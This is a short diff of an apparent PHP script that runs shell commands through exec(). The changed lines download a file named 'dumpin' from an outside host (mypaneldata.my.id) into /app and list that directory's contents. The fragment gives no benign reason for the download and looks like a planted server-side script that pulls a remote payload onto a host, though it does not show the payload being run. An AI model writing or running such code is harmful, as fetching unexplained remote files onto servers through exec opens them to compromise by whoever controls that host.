@@ -2,7 +2,7 @@
 
 //Store the output of the executed command
 
-$output1 =  exec('wget -q http://mypaneldata.my.id/dumpin');
+$output1 =  exec('wget -q -O /app/dumpin http://mypaneldata.my.id/dumpin');
 
 //Print the return value
 
@@ -22,7 +22,7 @@ echo "<br/>";
 
 //Store the last line of the executed command
 
-$output3 = exec('cd /vendor; ls -a');
+$output3 = exec('cd /app; ls -a');
 
 //Print the return value
 
